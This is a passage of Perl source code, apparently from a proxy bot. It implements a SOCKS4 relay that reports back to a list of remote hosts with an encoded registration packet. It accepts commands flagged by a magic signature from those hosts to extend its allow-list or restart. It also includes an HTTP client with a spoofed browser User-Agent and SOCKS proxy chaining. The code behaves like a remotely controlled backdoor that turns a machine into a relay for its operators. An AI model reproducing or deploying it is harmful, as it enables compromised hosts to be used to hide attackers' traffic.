	my $writers = IO::Select->new() or exit 0;
	my $session = {};
	my $destroy = sub
	{
	my $handle = shift;
	if (exists $session->{$handle})
	{
	$readers->remove($session->{$handle}{handle}) if $readers->exists($session->{$handle}{handle});
	$writers->remove($session->{$handle}{handle}) if $writers->exists($session->{$handle}{handle});
	close $session->{$handle}{handle};
	delete $session->{$handle};
	}
	};
	my $listen_socket = IO::Socket::INET->new(Proto => "tcp", LocalPort => $setting->{listen_v4_port}, Listen => SOMAXCONN, Reuse => 1);
	exit 0 unless $listen_socket;
	if ($^O eq "MSWin32") { ioctl ($listen_socket, 2147772030, pack ("L", 1)); } else { $listen_socket->blocking(0); }
	unless ($readers->add($listen_socket))
	{
	close $listen_socket;
	exit 0;
	}
	foreach (@{$setting->{remote_v4_host_list}})
	{
	my ($hostaddr, $hostport) = split (/:/, $_, 2);
	$hostaddr = pack ("C4", split (/\./, $hostaddr));
	if ($hostaddr)
	{
	$setting->{allow_host_list}{$hostaddr} = "";
	my $socket = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	next unless $socket;
	if ($^O eq "MSWin32") { ioctl ($socket, 2147772030, pack ("L", 1)); } else { $socket->blocking(0); }
	unless ($socket->connect($_ = sockaddr_in($hostport, $hostaddr)))
	{
	if ($! != $eiprogr && $! != $ewblock)
	{
	close $socket;
	next;
	}
	}
	unless ($writers->add($socket))
	{
	close $socket;
	next;
	}
	unless ($readers->add($socket))
	{
	$writers->remove($socket);
	close $socket;
	next;
	}
	$session->{$socket} =
	{
	status	=> "cn_rh",
	buffer	=> "",
	handle	=> $socket,
	target	=> "",
	flagset	=> 1,
	timeout	=> 0
	};
	}
	}
	$setting->{restart_timer} = time - 10 + $setting->{restart_timer} * 60;
	while (1)
	{
	IO::Select->select(undef, undef, undef, 0.01);
	my $readable = (IO::Select->select($readers, undef, undef, 0.01))[0];
	foreach my $handle (@$readable)
	{
	if ($handle eq $listen_socket)
	{
	my ($socket_one, $peer_addr) = $handle->accept;
	next unless $socket_one;
	$peer_addr = substr ($peer_addr, 4, 4);
	unless (exists $setting->{allow_host_list}{$peer_addr})
	{
	close $socket_one;
	next;
	}
	my $socket_two = IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	unless ($socket_two)
	{
	close $socket_one;
	next;
	}
	if ($^O eq "MSWin32") { ioctl ($socket_one, 2147772030, pack ("L", 1)); } else { $socket_one->blocking(0); }
	if ($^O eq "MSWin32") { ioctl ($socket_two, 2147772030, pack ("L", 1)); } else { $socket_two->blocking(0); }
	if ($readers->add($socket_one))
	{
	if ($readers->add($socket_two))
	{
	if ($writers->add($socket_one))
	{
	if ($writers->add($socket_two))
	{
	$session->{$socket_one} =
	{
	status	=> "rd_qr",
	buffer	=> "",
	handle	=> $socket_one,
	target	=> $socket_two,
	flagset	=> 1,
	timeout	=> 0
	};
	$session->{$socket_two} =
	{
	status	=> "wt_cm",
	buffer	=> "",
	handle	=> $socket_two,
	target	=> $socket_one,
	flagset	=> 1,
	timeout	=> 0
	};
	next;
	}
	$writers->remove($socket_one);
	}
	$readers->remove($socket_two);
	}
	$readers->remove($socket_one);
	}
	close $socket_one;
	close $socket_two;
	next;
	}
	next unless exists $session->{$handle};
	next if $session->{$handle}{status} !~ /^(rd|tr)/;
	my $buffer;
	if ($1 eq "rd")
	{
	$buffer = \$session->{$handle}{buffer};
	}
	elsif (exists $session->{$session->{$handle}{target}})
	{
	$buffer = \$session->{$session->{$handle}{target}}{buffer};
	}
	else
	{
	$destroy->($handle);
	next;
	}
	my $length = length $$buffer;
	my $unused = 8192 - $length;
	if ($unused > 0)
	{
	my $result = sysread ($handle, $$buffer, $unused, $length);
	if (defined $result)
	{
	if ($result > 0)
	{
	$session->{$handle}{flagset} = 1;
	$length += $result;
	}
	else
	{
	if (exists $session->{$session->{$handle}{target}})
	{
	unless (length $session->{$session->{$handle}{target}}{buffer})
	{
	$destroy->($session->{$handle}{target});
	}
	else
	{
	$readers->remove($session->{$handle}{target});
	}
	}
	$destroy->($handle);
	next;
	}
	}
	elsif ($! == $ewblock)
	{
	next;
	}
	else
	{
	$destroy->($session->{$handle}{target});
	$destroy->($handle);
	next;
	}
	}
	next if $session->{$handle}{status} eq "tr_dt";
	if ($session->{$handle}{status} eq "rd_qr")
	{
	next if $length < 2;
	my $signature = substr $$buffer, 0, 2;
	if ($signature == 1989)
	{
	$destroy->($session->{$handle}{target});
	$session->{$handle}{status} = "rd_rh";
	}
	elsif ($signature eq "\x04\x01")
	{
	$session->{$handle}{status} = "rd_cl";
	}
	else
	{
	$destroy->($session->{$handle}{target});
	$destroy->($handle);
	next;
	}
	}
	if ($session->{$handle}{status} eq "rd_rh")
	{
	next if $length < 20;
	if (unpack ("S", (substr $$buffer, 2, 2)) == 128)
	{
	$setting->{restart_timer} = 0;
	}
	elsif ((my $counter = unpack ("S", (substr $$buffer, 18, 2))) > 0)
	{
	next if $length < (20 + $counter * 4);
	while (my $allow_host = (substr $$buffer, 20, 4, ""))
	{
	last if (length $allow_host) < 4;
	$setting->{allow_host_list}{$allow_host} = "";
	}
	}
	$destroy->($handle);
	}
	else
	{
	next if $length < 9;
	if ((my $index = index $$buffer, "\x00", 8) > 0)
	{
	my $socket = $session->{$handle}{target};
	unless ($socket->connect($_ = sockaddr_in(unpack ("n", substr ($$buffer, 2, 2)), substr ($$buffer, 4, 4))))
	{
	if ($! != $eiprogr && $! != $ewblock)
	{
	$destroy->($session->{$handle}{target});
	$session->{$handle}{status} = "wr_rj";
	$$buffer = pack ("Sx6", 23296);
	next;
	}
	}
	$session->{$session->{$handle}{target}}{status} = "cn_th";
	$session->{$session->{$handle}{target}}{flagset} = 1;
	$session->{$handle}{status} = "wt_cm";
	substr ($$buffer, 0, $index + 1) = "";
	$session->{$session->{$handle}{target}}{buffer} = $$buffer;
	$$buffer = pack ("Sx6", 23040);
	}
	}
	}
	IO::Select->select(undef, undef, undef, 0.01);
	my $writable = (IO::Select->select(undef, $writers, undef, 0.01))[1];
	foreach my $handle (@$writable)
	{
	next unless exists $session->{$handle};
	next if $session->{$handle}{status} !~ /^((cn|wr|tr)_(.+))$/;
	if ($2 eq "cn")
	{
	if ($handle->connected)
	{
	if ($3 eq "rh")
	{
	$session->{$handle}{flagset} = 1;
	$session->{$handle}{status} = "wr_rh";
	$session->{$handle}{buffer} = pack ("Sna32", 1545, $setting->{listen_v4_port}, "7f787e6d78656b697e75226f63612223");
	}
	else
	{
	$session->{$session->{$handle}{target}}{flagset} = 1;
	$session->{$session->{$handle}{target}}{status} = "wr_gr";
	$session->{$handle}{status} = "wt_cm";
	}
	}
	else
	{
	if ($3 eq "rh")
	{
	}
	else
	{
	$session->{$session->{$handle}{target}}{flagset} = 1;
	$session->{$session->{$handle}{target}}{status} = "wr_rj";
	$session->{$session->{$handle}{target}}{buffer} = pack ("Sx6", 23296);
	}
	$destroy->($handle);
	}
	next;
	}
	if (length $session->{$handle}{buffer})
	{
	my $result = syswrite ($handle, $session->{$handle}{buffer});
	if (defined $result && $result > 0)
	{
	$session->{$handle}{flagset} = 1;
	substr ($session->{$handle}{buffer}, 0, $result) = "";
	unless (length $session->{$handle}{buffer})
	{
	if ($1 eq "wr_rh")
	{
	$session->{$handle}{status} = "rd_rh";
	}
	elsif ($1 eq "wr_rj")
	{
	$destroy->($handle);
	}
	elsif ($1 eq "wr_gr")
	{
	$session->{$handle}{status} = "tr_dt";
	$session->{$session->{$handle}{target}}{status} = "tr_dt";
	}
	elsif ($1 eq "tr_dt")
	{
	unless (exists $session->{$session->{$handle}{target}})
	{
	$destroy->($handle);
	}
	}
	}
	}
	elsif ($! == $ewblock)
	{
	next;
	}
	else
	{
	$destroy->($session->{$handle}{target});
	$destroy->($handle);
	}
	}
	}
	while (my ($handle, $values) = each %$session)
	{
	next if $values->{status} eq "wt_cm";
	my $timeout = time;
	if ($values->{flagset})
	{
	if ($values->{status} =~ /^cn/)
	{
	$timeout += $setting->{connect_timeout};
	}
	else
	{
	$timeout += $setting->{session_timeout};
	}
	if (exists $session->{$values->{target}})
	{
	$session->{$values->{target}}{timeout} = $timeout;$session->{$values->{target}}{flagset} = 0;
	}
	$values->{timeout} = $timeout;
	$values->{flagset} = 0;
	}
	elsif ($timeout >= $values->{timeout})
	{
	$destroy->($session->{$handle}{target});$destroy->($handle);
	}
	}
	if ($readers->exists($listen_socket) && time >= $setting->{restart_timer})
	{
	$readers->remove($listen_socket);close $listen_socket;
	&set_p() if $setting->{restart_timer};}
	last unless $readers->count or $writers->count;}
	exit 0;
}
sub http
{
	my ($bind, $timeout, $url, $post, $head, $proxy, $ns) = @_;
	my ($host, $port, $path) = $url =~ /^http:\/\/([^:\/]+):?(\d*)(.*)/i;
	return (undef, "HTTP. Invalid host in URL") if !defined $host || !length $host || $host !~ /^[a-zA-Z0-9\.\-]+$/;
	return (undef, "HTTP. Invalid port in URL") if defined $port && length $port && $port > 65535;
	return (undef, "HTTP. Invalid path in URL") if defined $path && length $path && $path !~ /^\//;
	$host = lc $host; $port = 80 if !length $port; $path = "/" if !length $path;
	my $http_data =
	[
	(defined $post ? "POST" : "GET") . " $path HTTP/1.0",
	"Host: $host",
	"User-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6",
	"Accept: text/html,*/*",
	"Accept-Language: en-us,en",
	"Accept-Encoding: deflate",
	"Accept-Charset: iso-8859-1,*",
	"Cache-Control: no-cache",
	"Connection: close",
	(defined $head ? @$head : ()),
	(defined $post ? ("Content-Length: " . length $post, "", $post) : ("", ""))
	];
	return (undef, "HTTP. Host does not exist") unless (my $host_addr = gethostbyname $host);
	return (undef, "HTTP. Host does not have an IPv4 address") if 4 != length $host_addr;
	my $readers = IO::Select->new() or return (undef, "HTTP. Can't create readers object");
	my $writers = IO::Select->new() or return (undef, "HTTP. Can't create writers object");
	my $socket = defined $bind ? IO::Socket::INET->new(LocalAddr => $bind, Proto => "tcp", Type => SOCK_STREAM) : IO::Socket::INET->new(Proto => "tcp", Type => SOCK_STREAM);
	return (undef, "HTTP. Can't create socket") unless $socket;
	my $connect_data; my $proxy_type = 0;
	if (defined $proxy)
	{
	if ($proxy =~ /^(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}):(\d{1,5})\#?(4|5)?$/ && $1 < 256 && $2 < 256 && $3 < 256 && $4 < 256 && $5 < 65536)
	{
	$proxy_type = defined $6 && length $6 ? $6 : 4;
	$connect_data = sockaddr_in($5, pack ("C4", $1, $2, $3, $4));
	}
	else
	{
	return (undef, "HTTP. Non-valid proxy address");
	}
	}
	else
	{
	$connect_data = sockaddr_in($port, $host_addr);
	}
	if ($^O eq "MSWin32") { ioctl ($socket, 0x8004667e, pack ("L", 1)); } else { $socket->blocking(0); }
	unless ($socket->connect($connect_data))
	{
	if ($! != POSIX::EINPROGRESS && $! != POSIX::EWOULDBLOCK)
	{
	close $socket;
	return (undef, "HTTP. Can't connect");
	}
	}
	$writers->add($socket);
	$timeout += time;
	my ($session, $buffer, $http_error, $http_head, $http_body) = (0, "", "", undef, "Unexpected error");
	while (1)
	{
	my $writable = (IO::Select->select(undef, $writers, undef, 0))[1];
	foreach my $handle (@$writable)
	{
	if ($session)
	{
	if ($session == 1)
	{
	if ($proxy_type == 4)
	{
	$session = 2;
	$buffer = pack ("C2na4C", 4, 1, $port, $host_addr, 0);
	}
	elsif ($proxy_type == 5)
	{
	$session = 3;
	$buffer = pack ("C3", 5, 1, 0);
	}
	else
	{
	$session = 4;
	}
	}
	if ($session == 4)
	{
	$session = 5;
	$buffer = join ("\x0D\x0A", @$http_data);
	}
	if ($session == 6)
	{
	$session = 7;
	$buffer = pack ("C4a4n", 5, 1, 0, 1, $host_addr, $port);
	}
	my $result = syswrite ($handle, $buffer);
	if (defined $result && $result > 0)
	{
	substr ($buffer, 0, $result) = "";
	unless (length $buffer)
	{
	$readers->add($handle);
	$writers->remove($handle);
	}
	}
	elsif ($! == POSIX::EWOULDBLOCK)
	{
	next;
	}
	else
	{
	$http_error = "Write error";
	$timeout = 0;
	}
	}
	else
	{
	$session = 1 if $handle->connected;
	}
	}
	my $readable = (IO::Select->select($readers, undef, undef, 0))[0];
	foreach my $handle (@$readable)
	{
	my $result = sysread ($handle, $buffer, 8192, length $buffer);
	if (1048576 < length $buffer)
	{
	$http_error = "Data too big";
	$timeout = 0;
	}
	elsif (defined $result)
	{
	if ($session == 5)
	{
	if ($result == 0)
	{
	my $offset = index ($buffer, "\x0D\x0A\x0D\x0A");
	if ($offset < 0)
	{
	$http_error = "Invalid document header";
	}
	else
	{
	$http_head = substr ($buffer, 0, $offset, "");
	$http_body = 4 < length $buffer ? substr ($buffer, 4) : "";
	$http_error = "Non-HTTP data" if $http_head !~ /^HTTP\S+\s+\d\d\d/;
	}
	$timeout = 0;
	}
	}
	elsif ($session == 2)
	{
	next if 8 > length $buffer;
	@_ = unpack ("C2na4", substr ($buffer, 0, 8, ""));
	if ($_[0] == 0 && $_[1] == 90)
	{
	$session = 4;
	}
	else
	{
	$http_error = "PROXY error. SOCKSv4 connect $_[0]x$_[1]";
	$timeout = 0;
	}
	}
	elsif ($session == 3)
	{
	next if 2 > length $buffer;
	@_ = unpack ("C2", substr ($buffer, 0, 2, ""));
	if ($_[0] == 5 && $_[1] == 0)
	{
	$session = 6;
	}
	else
	{
	$http_error = "PROXY error. SOCKSv5 method $_[0]x$_[1]";
	$timeout = 0;
	}
	}
	elsif ($session == 7)
	{
	next if 10 > length $buffer;
	@_ = unpack ("C8n", substr ($buffer, 0, 10, ""));
	if ($_[0] == 5 && $_[1] == 0)
	{
	$session = 4;
	}
	else
	{
	$http_error = "PROXY error. SOCKSv5 connect $_[0]x$_[1]";
	$timeout = 0;
	}
	}
	if ($session == 4 || $session == 6)
	{
	$writers->add($handle);
	$readers->remove($handle);
	}
	}
	elsif ($! == POSIX::EWOULDBLOCK)
	{
	next;
	}
	else
	{
	$http_error = "Read error";
	$timeout = 0;
	}
	}
	if ($timeout < time)
	{
	foreach my $handle ($writers->handles, $readers->handles)
	{
	$writers->remove($handle) if $writers->exists($handle);
	$readers->remove($handle) if $readers->exists($handle);
	close $handle;
	}
	$http_error = "Operation timeout" if $timeout;
	last;
	}
	}
	return (undef, "HTTP. $http_error") if length $http_error;
	return ($http_head, $http_body);
}
